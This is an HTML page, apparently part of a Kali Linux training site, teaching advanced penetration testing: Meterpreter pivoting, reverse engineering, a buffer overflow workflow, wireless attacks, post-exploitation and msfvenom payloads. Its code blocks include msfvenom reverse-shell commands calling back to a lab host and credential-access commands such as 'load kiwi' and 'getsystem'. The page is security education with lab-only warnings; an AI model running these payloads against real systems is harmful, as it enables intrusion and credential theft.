@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Advanced Track — Kali Linux Learning Hub</title>
+<meta name="description" content="Advanced Kali Linux: reverse engineering, buffer overflow basics, post-exploitation, custom payload development, and full pentesting methodology.">
+<link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+<header class="site-header">
+  <div class="nav-titlebar">
+    <div class="wrap" style="display:flex;align-items:center;gap:10px;">
+      <div class="term-dots"><span></span><span></span><span></span></div>
+      <div class="term-path"><span class="caret">➜</span> kali-learning-hub git:(main) root@kali:~/advanced#</div>
+    </div>
+  </div>
+  <nav class="navbar wrap">
+    <a href="../index.html" class="brand">
+      <svg class="brand-mark" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="2" y="2" width="60" height="60" rx="14" fill="#121822" stroke="#263140" stroke-width="2"/><path d="M18 21 L30 32 L18 43" fill="none" stroke="#2bd9c9" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="34" y1="43" x2="47" y2="43" stroke="#9c8cf5" stroke-width="4.5" stroke-linecap="round"/></svg>
+      <span class="brand-name">kali<span class="dim">@</span>learning-hub</span>
+    </a>
+    <div class="nav-links" id="navLinks">
+      <a href="../index.html">~/home</a>
+      <a href="../beginner/index.html">~/beginner</a>
+      <a href="../intermediate/index.html">~/intermediate</a>
+      <a href="../advanced/index.html" class="active" aria-current="page">~/advanced</a>
+      <a href="../projects/index.html">~/projects</a>
+      <a href="../resources/index.html">~/resources</a>
+    </div>
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="navLinks">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+  </nav>
+</header>
+
+<main style="--level-accent: var(--accent-crimson);">
+
+  <section class="level-hero">
+    <div class="wrap">
+      <div class="level-hero-top">
+        <span class="badge badge-advanced">Advanced Track</span>
+        <a href="../projects/index.html" class="btn btn-outline btn-sm">Jump to advanced projects →</a>
+      </div>
+      <h1>Exploitation, reverse engineering, and full-scope methodology.</h1>
+      <p>This is capstone-level material: binary exploitation fundamentals, reverse engineering, post-exploitation, and the end-to-end methodology professionals follow on real engagements. Every technique here assumes a fully isolated lab and a signed scope — there is no legitimate reason to run this material anywhere else.</p>
+      <div class="level-meta">
+        <div><b>07</b>modules</div>
+        <div><b>03</b>paired projects</div>
+        <div><b>~20h+</b>self-paced</div>
+        <div><b>Intermediate track</b>required first</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="wrap level-layout">
+    <aside class="toc">
+      <div class="toc-label">On this page</div>
+      <ol>
+        <li><a href="#advanced-metasploit">Advanced Metasploit</a></li>
+        <li><a href="#reverse-engineering">Reverse engineering tools</a></li>
+        <li><a href="#buffer-overflow">Buffer overflow basics</a></li>
+        <li><a href="#advanced-wireless">Advanced wireless attacks</a></li>
+        <li><a href="#post-exploitation">Post-exploitation techniques</a></li>
+        <li><a href="#custom-payloads">Custom payload development</a></li>
+        <li><a href="#methodology">Full pentesting methodology</a></li>
+      </ol>
+      <div class="toc-label" style="margin-top:22px;">Paired projects</div>
+      <ol style="counter-reset: none;">
+        <li style="list-style:none;"><a href="../projects/index.html#buffer-overflow-project" style="padding-left:10px;">Buffer overflow exploitation</a></li>
+        <li style="list-style:none;"><a href="../projects/index.html#reverse-engineering-project" style="padding-left:10px;">Reverse engineering</a></li>
+        <li style="list-style:none;"><a href="../projects/index.html#ad-pentest" style="padding-left:10px;">Active Directory pentest</a></li>
+      </ol>
+    </aside>
+
+    <div class="modules">
+
+      <!-- MODULE 1 -->
+      <article class="module term-window" id="advanced-metasploit">
+        <div class="module-head"><span class="idx">01</span><h2>Advanced Metasploit</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Beyond running a single exploit module, real Metasploit usage revolves around Meterpreter — an in-memory post-exploitation agent — session management across multiple compromised hosts, and pivoting your attack traffic through a host you've already compromised to reach machines that weren't directly reachable before.</p>
+
+          <h4>Meterpreter fundamentals</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>meterpreter</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">meterpreter &gt;</span> sysinfo               <span class="c-comment"># OS, hostname, architecture</span>
+<span class="c-prompt">meterpreter &gt;</span> getuid                 <span class="c-comment"># current user context</span>
+<span class="c-prompt">meterpreter &gt;</span> ps                      <span class="c-comment"># list running processes</span>
+<span class="c-prompt">meterpreter &gt;</span> migrate 1240             <span class="c-comment"># move the session into another process for stability</span>
+<span class="c-prompt">meterpreter &gt;</span> background               <span class="c-comment"># return to msfconsole, keep the session alive</span></code></pre>
+          </div>
+
+          <h4>Managing multiple sessions &amp; pivoting</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>msfconsole</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">msf6 &gt;</span> sessions -l                    <span class="c-comment"># list active sessions</span>
+<span class="c-prompt">msf6 &gt;</span> sessions -i 2                  <span class="c-comment"># interact with session 2</span>
+<span class="c-prompt">msf6 &gt;</span> route add 172.16.0.0/24 2      <span class="c-comment"># pivot: route this subnet through session 2</span>
+<span class="c-prompt">msf6 &gt;</span> use auxiliary/scanner/portscan/tcp</code></pre>
+          </div>
+          <p>Pivoting means an internal subnet that was never directly reachable from your Kali box becomes reachable through the compromised host's own network connection — a core technique in any multi-tier lab like the Active Directory project later in this track.</p>
+
+          <h4>Working with the database</h4>
+          <ul>
+            <li><code>msfdb init</code> — sets up Metasploit's PostgreSQL-backed database for storing scan and session data</li>
+            <li><code>workspace -a client-lab</code> — keeps different engagements' data separated</li>
+            <li><code>hosts</code>, <code>services</code>, <code>creds</code> — query what Metasploit has already learned about your lab</li>
+          </ul>
+        </div>
+      </article>
+
+      <!-- MODULE 2 -->
+      <article class="module term-window" id="reverse-engineering">
+        <div class="module-head"><span class="idx">02</span><h2>Reverse engineering tools</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Reverse engineering is the practice of analyzing a compiled binary to understand what it does without having its source code — essential for malware analysis, vulnerability research, and CTF "reversing" challenges. Kali includes a full static- and dynamic-analysis toolchain.</p>
+
+          <h4>Static analysis — reading without running</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> file challenge.bin           <span class="c-comment"># identify file type, architecture</span>
+<span class="c-prompt">$</span> strings challenge.bin | less  <span class="c-comment"># pull readable text out of the binary</span>
+<span class="c-prompt">$</span> objdump -d challenge.bin      <span class="c-comment"># disassemble to raw assembly</span></code></pre>
+          </div>
+          <ul>
+            <li><strong>Ghidra</strong> — the NSA-developed, free disassembler/decompiler; turns assembly back into readable pseudo-C, the standard starting point for serious analysis</li>
+            <li><strong>radare2 / rizin</strong> — terminal-based reverse engineering frameworks with scripting support</li>
+          </ul>
+
+          <h4>Dynamic analysis — watching it run</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>gdb</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> gdb ./challenge
+<span class="c-prompt">(gdb)</span> break main
+<span class="c-prompt">(gdb)</span> run
+<span class="c-prompt">(gdb)</span> info registers
+<span class="c-prompt">(gdb)</span> disassemble</code></pre>
+          </div>
+          <ul>
+            <li>GDB with the GEF or PEDA extensions adds much friendlier output for exploit development work</li>
+            <li>Dynamic analysis lets you set breakpoints, step through instructions, and inspect memory and registers as the program actually executes — this is the same discipline used in the buffer overflow module next</li>
+          </ul>
+
+          <div class="callout callout-info">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><line x1="12" y1="11" x2="12" y2="16.5"/><circle cx="12" cy="7.7" r="0.6" fill="currentColor" stroke="none"/></svg>
+            <p><strong>Practice on CTF-style binaries</strong>Sites like crackmes.one and the reversing categories on picoCTF and HackTheBox provide binaries built specifically to be reverse-engineered, so you're never analyzing something you don't have the right to.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 3 -->
+      <article class="module term-window" id="buffer-overflow">
+        <div class="module-head"><span class="idx">03</span><h2>Buffer overflow basics</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>A stack-based buffer overflow happens when a program writes more data into a fixed-size buffer than it was sized for, overwriting adjacent memory — including, if the offset is right, the saved return address (EIP on 32-bit x86). Control that address and you control where execution jumps next. Modern systems mitigate this with stack canaries, DEP, and ASLR, but the classic technique is still the foundation every exploit developer learns first, and it's taught almost universally against one intentionally vulnerable practice program.</p>
+
+          <h4>The standard learning workflow</h4>
+          <ul>
+            <li>Run a purpose-built vulnerable TCP application (the classic teaching target is the open-source "vulnserver") in an isolated Windows lab VM, attached to a debugger like Immunity Debugger with the mona.py plugin</li>
+            <li><strong>Fuzz</strong> — send progressively longer input strings from Kali until the debugger shows the program crash</li>
+            <li><strong>Find the offset</strong> — generate a unique cyclic pattern and use it to find exactly how many bytes precede the return address</li>
+            <li><strong>Control EIP</strong> — confirm you can overwrite the return address with a known 4-byte value</li>
+            <li><strong>Find bad characters</strong> — identify bytes (like <code>\x00</code>) that corrupt your payload when sent, so you know what to avoid</li>
+            <li><strong>Find a JMP ESP</strong> — locate a reliable instruction in a non-randomized module to redirect execution into your shellcode</li>
+            <li><strong>Generate shellcode</strong> — build a payload with msfvenom, avoiding the bad characters you identified</li>
+          </ul>
+
+          <div class="code-block">
+            <div class="cb-head"><span>kali — recon &amp; payload generation</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-comment"># 1. generate a cyclic pattern to find the EIP offset</span>
+<span class="c-prompt">$</span> msf-pattern_create <span class="c-flag">-l</span> 600
+
+<span class="c-comment"># 2. once you have the crash value from the debugger, find its offset</span>
+<span class="c-prompt">$</span> msf-pattern_offset <span class="c-flag">-l</span> 600 <span class="c-flag">-q</span> &lt;value_from_EIP&gt;
+
+<span class="c-comment"># 3. generate shellcode once bad characters are known (placeholders below —</span>
+<span class="c-comment">#    you determine the real offset and JMP ESP address yourself, in your own lab)</span>
+<span class="c-prompt">$</span> msfvenom <span class="c-flag">-p</span> windows/shell_reverse_tcp LHOST=10.0.10.10 LPORT=4444 \
+    <span class="c-flag">-b</span> <span class="c-str">"\x00\x0a\x0d"</span> <span class="c-flag">-f</span> python <span class="c-flag">-v</span> shellcode</code></pre>
+          </div>
+
+          <div class="callout callout-caution">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4M12 16.5h.01M10.3 3.9 2.6 18a2 2 0 0 0 1.8 3h15.2a2 2 0 0 0 1.8-3L13.7 3.9a2 2 0 0 0-3.4 0z"/></svg>
+            <p><strong>This is an outline, not a script</strong>Every offset and address above is specific to the exact binary, build, and lab you're running — that's intentional. Buffer overflow exploit development is a hands-on debugging skill, not something you can copy-paste; you're expected to work through each step yourself in a debugger against your own isolated lab VM.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 4 -->
+      <article class="module term-window" id="advanced-wireless">
+        <div class="module-head"><span class="idx">04</span><h2>Advanced wireless attacks</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Beyond capturing a WPA handshake, advanced wireless testing covers attacking the WPS mechanism, setting up rogue access points for social-engineering-style tests, and newer clientless attacks that don't require waiting for a device to reconnect.</p>
+
+          <h4>Categories you'll encounter</h4>
+          <ul>
+            <li><strong>WPS attacks</strong> — tools like Reaver and Bully target the WPS PIN mechanism on routers that still have it enabled, which is far weaker than the WPA2 passphrase itself</li>
+            <li><strong>PMKID attacks</strong> — <code>hcxdumptool</code> can sometimes capture enough data to attempt a passphrase attack without ever seeing a full 4-way handshake or deauthenticating anyone</li>
+            <li><strong>Evil Twin / rogue AP</strong> — tools like <code>airbase-ng</code> create a fake access point mimicking a real one, used in authorized engagements to test whether users can be tricked into connecting</li>
+            <li><strong>Captive portal attacks</strong> — combine a rogue AP with a fake login page to test organizational security-awareness, always as part of a scoped, consented engagement</li>
+          </ul>
+
+          <div class="callout callout-legal">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 2 20h20L12 2z"/><line x1="12" y1="9" x2="12" y2="14"/><circle cx="12" cy="17.2" r="0.6" fill="currentColor" stroke="none"/></svg>
+            <p><strong>This is the highest-liability category on this site</strong>Rogue access points and deauthentication affect anyone nearby, not just your target — running these outside a dedicated, owned lab or a formally scoped, written engagement is both illegal and disruptive to real people. This hub covers what these tools do conceptually; it does not walk through operating them against a live target.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 5 -->
+      <article class="module term-window" id="post-exploitation">
+        <div class="module-head"><span class="idx">05</span><h2>Post-exploitation techniques</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Getting a shell is the beginning of an assessment, not the end. Post-exploitation is about understanding how far an attacker could actually go from that foothold — the answer to "so what?" that turns a technical finding into a business risk a client can act on.</p>
+
+          <h4>What professional post-exploitation covers</h4>
+          <ul>
+            <li><strong>Local enumeration</strong> — running LinPEAS/WinPEAS-style scripts to surface privilege escalation paths automatically</li>
+            <li><strong>Credential harvesting</strong> — extracting cached credentials or hashes on a host you already control, then using tools like <code>hashdump</code> in Meterpreter to feed into John or Hashcat</li>
+            <li><strong>Lateral movement</strong> — using credentials or trust relationships found on one host to reach the next, exactly the pivoting technique from the Advanced Metasploit module</li>
+            <li><strong>Persistence</strong> — techniques an attacker could use to survive a reboot, studied so defenders know what to look for, and always removed at the end of an authorized test</li>
+            <li><strong>Data-handling discipline</strong> — real engagements define exactly what counts as "proof" (a screenshot, a hostname) vs. what should never be exfiltrated, even during an authorized test</li>
+          </ul>
+
+          <div class="code-block">
+            <div class="cb-head"><span>meterpreter</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">meterpreter &gt;</span> run post/multi/recon/local_exploit_suggester
+<span class="c-prompt">meterpreter &gt;</span> load kiwi                    <span class="c-comment"># credential-access extension (Windows, needs admin)</span>
+<span class="c-prompt">meterpreter &gt;</span> getsystem                     <span class="c-comment"># attempt automatic privilege escalation</span></code></pre>
+          </div>
+
+          <div class="callout callout-tip">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18h6M10 21h4M12 3a6 6 0 0 0-4 10.5c.6.6 1 1.3 1 2.5h6c0-1.2.4-1.9 1-2.5A6 6 0 0 0 12 3z"/></svg>
+            <p><strong>This is why reporting matters</strong>Everything in this module exists to answer one question for a client: "what's the real-world impact if this entry point isn't fixed?" That question — not the exploit itself — is the actual deliverable of a professional pentest.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 6 -->
+      <article class="module term-window" id="custom-payloads">
+        <div class="module-head"><span class="idx">06</span><h2>Custom payload development</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Msfvenom is Metasploit's standalone payload generator — the same tool referenced earlier for buffer overflow shellcode, but worth understanding as its own subject: how a payload is built, encoded, and packaged for different targets and delivery methods.</p>
+
+          <h4>Generating a basic payload</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> msfvenom <span class="c-flag">-p</span> windows/x64/meterpreter/reverse_tcp \
+    LHOST=10.0.10.10 LPORT=4444 <span class="c-flag">-f</span> exe <span class="c-flag">-o</span> payload.exe
+
+<span class="c-prompt">$</span> msfvenom <span class="c-flag">-p</span> linux/x64/shell_reverse_tcp \
+    LHOST=10.0.10.10 LPORT=4444 <span class="c-flag">-f</span> elf <span class="c-flag">-o</span> payload.elf</code></pre>
+          </div>
+          <ul>
+            <li><code>-p</code> selects the payload; naming follows <code>platform/arch/type</code></li>
+            <li><code>LHOST</code> / <code>LPORT</code> is where the payload calls back to — your Kali VM, listening with a matching <code>multi/handler</code></li>
+            <li><code>-f</code> sets the output format: <code>exe</code>, <code>elf</code>, <code>python</code>, <code>raw</code>, and more</li>
+            <li>Staged payloads (like <code>reverse_tcp</code>) send a small stager first, then pull the full payload over the connection; stageless payloads (<code>reverse_tcp</code> vs <code>meterpreter/reverse_tcp</code> variants) send everything at once</li>
+          </ul>
+
+          <h4>Why "encoding" isn't real evasion anymore</h4>
+          <p>Older material talks about msfvenom's <code>-e</code> encoders as an antivirus bypass technique. In practice, every mainstream antivirus and EDR product has signatures for Metasploit's default encoders — they no longer evade real security software. Understanding <em>why</em> they fail (signature-based detection, behavioral analysis, memory scanning) matters more than the encoder flags themselves; genuine evasion is a specialized discipline built on custom tooling, not a one-line flag.</p>
+
+          <div class="callout callout-legal">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 2 20h20L12 2z"/><line x1="12" y1="9" x2="12" y2="14"/><circle cx="12" cy="17.2" r="0.6" fill="currentColor" stroke="none"/></svg>
+            <p><strong>A payload is software, not a toy</strong>Building and running a payload outside a lab you control — even "just to see if it works" — is the same as deploying malware. Every payload you generate here should call back to your own Kali VM, on your own isolated network, against your own target.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 7 -->
+      <article class="module term-window" id="methodology">
+        <div class="module-head"><span class="idx">07</span><h2>Full pentesting methodology</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Everything in this hub is a piece of a larger, disciplined process. Professional engagements follow a structured methodology — loosely based on frameworks like PTES (Penetration Testing Execution Standard), the OWASP Testing Guide, and NIST SP 800-115 — so findings are reproducible, safe, and legally defensible.</p>
+
+          <figure style="margin: 4px 0 22px;">
+            <img src="../assets/img/methodology-flow.svg" alt="Five-phase pentesting methodology flow: 01 Reconnaissance, 02 Scanning and Enumeration, 03 Gaining Access, 04 Post-Exploitation, 05 Reporting.">
+          </figure>
+
+          <h4>The five phases</h4>
+          <ul>
+            <li><strong>0. Pre-engagement</strong> — scope, rules of engagement, emergency contacts, and a signed authorization letter, before a single tool runs</li>
+            <li><strong>1. Reconnaissance</strong> — passive and active information gathering: WHOIS, DNS records, employee names, exposed subdomains</li>
+            <li><strong>2. Scanning &amp; enumeration</strong> — Nmap and service-specific enumeration to build a full picture of the attack surface</li>
+            <li><strong>3. Gaining access</strong> — exploitation of a discovered vulnerability, using the tools from the intermediate and advanced tracks</li>
+            <li><strong>4. Post-exploitation</strong> — privilege escalation, lateral movement, and demonstrating real-world impact, strictly within agreed scope</li>
+            <li><strong>5. Reporting &amp; cleanup</strong> — removing any tools, backdoors, or accounts created during testing, then delivering a report with severity ratings and remediation steps</li>
+          </ul>
+
+          <h4>What a good report actually contains</h4>
+          <ul>
+            <li>An executive summary a non-technical stakeholder can understand</li>
+            <li>Each finding with a severity rating, reproduction steps, evidence, and a specific fix</li>
+            <li>A retest section once the client has remediated, confirming the fix actually worked</li>
+          </ul>
+
+          <div class="callout callout-tip">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18h6M10 21h4M12 3a6 6 0 0 0-4 10.5c.6.6 1 1.3 1 2.5h6c0-1.2.4-1.9 1-2.5A6 6 0 0 0 12 3z"/></svg>
+            <p><strong>This is the capstone project</strong>The Active Directory pentest project below walks this entire methodology end to end, against a small multi-machine lab you build yourself.</p>
+          </div>
+        </div>
+      </article>
+
+    </div>
+  </div>
+
+  <!-- ============ PAIRED PROJECTS ============ -->
+  <section class="tight">
+    <div class="wrap">
+      <div class="eyebrow">ls ~/projects --level=advanced</div>
+      <h2 class="section-title">Put it into practice</h2>
+      <p class="section-lede" style="margin-bottom:30px;">Three capstone projects that bring the whole track together.</p>
+      <div class="grid-3">
+        <article class="project-card term-window">
+          <div class="term-titlebar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-path">~/projects/buffer-overflow</div></div>
+          <div class="project-card-body">
+            <span class="badge badge-advanced">Advanced</span>
+            <h3>Buffer overflow exploitation</h3>
+            <p>Work a classic stack overflow end to end against a purpose-built vulnerable app in your own debugger lab.</p>
+            <a href="../projects/index.html#buffer-overflow-project" class="btn btn-outline btn-sm">View project →</a>
+          </div>
+        </article>
+        <article class="project-card term-window">
+          <div class="term-titlebar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-path">~/projects/reverse-engineering</div></div>
+          <div class="project-card-body">
+            <span class="badge badge-advanced">Advanced</span>
+            <h3>Reverse engineering challenge</h3>
+            <p>Use Ghidra and GDB to reverse a small CTF-style crackme binary and recover its hidden logic.</p>
+            <a href="../projects/index.html#reverse-engineering-project" class="btn btn-outline btn-sm">View project →</a>
+          </div>
+        </article>
+        <article class="project-card term-window">
+          <div class="term-titlebar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-path">~/projects/ad-pentest</div></div>
+          <div class="project-card-body">
+            <span class="badge badge-advanced">Advanced</span>
+            <h3>Active Directory pentest</h3>
+            <p>Build a small AD lab and run the full methodology against it, from recon to a written report.</p>
+            <a href="../projects/index.html#ad-pentest" class="btn btn-outline btn-sm">View project →</a>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-col footer-brand">
+        <a href="../index.html" class="brand" style="margin-bottom:12px; display:inline-flex;">
+          <svg class="brand-mark" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="2" y="2" width="60" height="60" rx="14" fill="#121822" stroke="#263140" stroke-width="2"/><path d="M18 21 L30 32 L18 43" fill="none" stroke="#2bd9c9" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="34" y1="43" x2="47" y2="43" stroke="#9c8cf5" stroke-width="4.5" stroke-linecap="round"/></svg>
+          <span class="brand-name">kali<span class="dim">@</span>learning-hub</span>
+        </a>
+        <p>A free, independent Kali Linux curriculum for learning ethical hacking safely and legally. Not affiliated with or endorsed by Offensive Security.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Learn</h4>
+        <ul>
+          <li><a href="../beginner/index.html">Beginner track</a></li>
+          <li><a href="../intermediate/index.html">Intermediate track</a></li>
+          <li><a href="../advanced/index.html">Advanced track</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Explore</h4>
+        <ul>
+          <li><a href="../projects/index.html">All projects</a></li>
+          <li><a href="../resources/index.html">Cheat sheets</a></li>
+          <li><a href="../resources/index.html#legal">Legal guidelines</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Official docs</h4>
+        <ul>
+          <li><a href="https://www.kali.org/docs/" target="_blank" rel="noopener">Kali Linux docs</a></li>
+          <li><a href="https://nmap.org/book/" target="_blank" rel="noopener">Nmap reference guide</a></li>
+          <li><a href="https://owasp.org/" target="_blank" rel="noopener">OWASP</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>root@kali:~/advanced# exit</p>
+      <p>© 2026 Kali Linux Learning Hub · Educational content only · For authorized lab use</p>
+    </div>
+  </div>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
